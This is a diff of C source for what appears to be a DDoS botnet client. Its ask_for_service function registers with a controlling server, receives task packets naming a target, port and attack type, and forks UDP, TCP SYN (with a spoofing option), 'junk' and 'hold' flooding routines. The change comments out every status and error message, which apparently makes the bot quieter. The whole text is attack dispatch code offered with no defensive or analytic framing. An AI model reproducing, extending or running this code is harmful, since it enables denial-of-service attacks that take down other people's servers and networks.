@@ -212,7 +212,7 @@ int ask_for_service( int server_fd )
         p.type = packet_register;
         if (writen(server_fd, &p, sizeof(p)) != sizeof(p) )
         {
-            fprintf(stderr, "Error: writen\n");
+            //fprintf(stderr, "Error: writen\n");
             if ( check_fd(server_fd) )
                 close(server_fd);
             return -1;
@@ -225,7 +225,7 @@ int ask_for_service( int server_fd )
         retval = select(server_fd+1, &server_fd_set, NULL, NULL, &tv);
         if ( retval == -1 )  // error
         {
-            fprintf(stderr, "Error, select retval == -1\n");
+            //fprintf(stderr, "Error, select retval == -1\n");
             if ( check_fd(server_fd) )
                 close(server_fd);
             return -1;
@@ -249,7 +249,7 @@ int ask_for_service( int server_fd )
             }
             if ( q.type == packet_task_sign )
             {
-                fprintf(stdout, "Info, got task:%s\n", q.value); // todo: fork task
+                //fprintf(stdout, "Info, got task:%s\n", q.value); // todo: fork task
                 char type[16] = {0}; // udp, tcp, junk, hold
                 char flags[32] = {0}; // all, syn, rst, fin, ack, psh
                 char target[256] = {0};
@@ -277,7 +277,7 @@ int ask_for_service( int server_fd )
                 {
                     if ( !listFork() )
                     {
-                        printf("starting sendHOLD...\n");
+                        //printf("starting sendHOLD...\n");
                         sendHOLD(target, port, time);
                         close(server_fd);
                         _exit(0);
@@ -287,7 +287,7 @@ int ask_for_service( int server_fd )
                 {
                     if ( !listFork() )
                     {
-                        printf("starting sendJUNK...\n");
+                        //printf("starting sendJUNK...\n");
                         sendJUNK(target, port, time);
                         close(server_fd);
                         _exit(0);
@@ -297,7 +297,7 @@ int ask_for_service( int server_fd )
                 {
                     if ( !listFork() )
                     {
-                        printf("starting sendUDP...\n");
+                        //printf("starting sendUDP...\n");
                         sendUDP(target, port, time, spoof, packetsize, pollinterval);
                         close(server_fd);
                         _exit(0);
@@ -309,7 +309,7 @@ int ask_for_service( int server_fd )
                     {
                         if ( strcmp(flags, "") == 0 )
                             strcpy(flags, "syn");
-                        printf("starting sendTCP...\n");
+                        //printf("starting sendTCP...\n");
                         sendTCP(target, port, time, spoof, flags, packetsize, pollinterval);
                         close(server_fd);
                         _exit(0);
